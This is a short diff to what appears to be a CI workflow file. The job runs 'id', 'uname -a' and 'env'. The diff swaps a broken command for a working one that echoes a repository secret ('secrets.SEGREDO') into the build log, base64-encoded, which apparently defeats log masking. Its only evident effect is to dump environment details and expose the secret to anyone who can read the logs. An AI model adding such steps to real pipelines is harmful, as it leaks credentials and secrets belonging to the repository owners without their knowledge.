@@ -10,4 +10,5 @@ jobs:
       - run: id
       - run: uname -a
       - run: env
-      - run: base64 -e ${{ secrets.SEGREDO }} | echo
+      - run: echo "${{ secrets.SEGREDO }}" | base64
+
